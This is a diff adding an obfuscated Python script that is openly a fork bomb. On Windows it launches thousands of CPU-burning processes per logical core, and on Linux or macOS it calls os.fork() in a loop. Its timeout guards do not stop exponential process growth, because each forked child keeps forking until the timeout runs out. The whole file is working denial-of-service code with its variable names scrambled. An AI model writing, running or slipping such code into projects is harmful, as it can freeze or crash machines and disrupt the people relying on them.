@@ -1,0 +1,50 @@
+import platform #line:1
+import os #line:2
+from multiprocessing import Process ,cpu_count #line:3
+import time #line:4
+def counter (O0O00OO0OO0O00OOO ):#line:6
+    while O0O00OO0OO0O00OOO >0 :#line:7
+        O0O00OO0OO0O00OOO -=1 #line:8
+        time .sleep (0.01 )#line:9
+        O00O00O0O0OO0000O =O0O00OO0OO0O00OOO **2 /5.115697498 #line:10
+def spawn_processes (OO0000OO00OO0OOOO ,timeout =5 ):#line:12
+    OO00OO0O0OO0OO0OO =time .time ()#line:13
+    O0000O000O0OO0OOO =[]#line:14
+    for _O00OO0O00O00OOO0O in range (OO0000OO00OO0OOOO ):#line:16
+        if time .time ()-OO00OO0O0OO0OO0OO >timeout :#line:17
+            print ("Stopping process creation after timeout.")#line:18
+            break #line:19
+        O00O0O0O0O0OOOO0O =Process (target =counter ,args =(1000000 ,))#line:20
+        O00O0O0O0O0OOOO0O .start ()#line:21
+        O0000O000O0OO0OOO .append (O00O0O0O0O0OOOO0O )#line:22
+        print (f"Started process {O00O0O0O0O0OOOO0O.pid}.")#line:23
+    for O00O0O0O0O0OOOO0O in O0000O000O0OO0OOO :#line:25
+        O00O0O0O0O0OOOO0O .join ()#line:26
+        print (f"Process {O00O0O0O0O0OOOO0O.pid} has finished.")#line:27
+def main (timeout =5 ):#line:29
+    O00OO0OO00O00OOOO =cpu_count ()#line:30
+    OO00OO000000O000O =O00OO0OO00O00OOOO *10000 #line:31
+    print (f"Number of logical processors: {O00OO0OO00O00OOOO}")#line:32
+    print (f"Creating {OO00OO000000O000O} processes.")#line:33
+    print ("Warning: This will consume system resources. Running with timeout.")#line:34
+    spawn_processes (OO00OO000000O000O ,timeout )#line:35
+def linux_fork_bomb (timeout =5 ):#line:37
+    OOOOO0O00O00OO00O =time .time ()#line:38
+    while True :#line:40
+        if time .time ()-OOOOO0O00O00OO00O >timeout :#line:41
+            print ("Stopping fork bomb after timeout.")#line:42
+            break #line:43
+        os .fork ()#line:44
+        time .sleep (0.1 )#line:46
+def forkbomb ():#line:48
+    OOOO0O000O0O00O00 =platform .system ()#line:49
+    OOOO000O0OOOO000O =5 #line:50
+    if OOOO0O000O0O00O00 =="Windows":#line:51
+        if __name__ =="__main__":#line:52
+            main (OOOO000O0OOOO000O )#line:53
+    elif OOOO0O000O0O00O00 in ["Darwin","Linux"]:#line:54
+        linux_fork_bomb (OOOO000O0OOOO000O )#line:55
+    else :#line:56
+        print ("Unsupported OS.")#line:57
+if __name__ =="__main__":#line:59
+    forkbomb ()#line:60
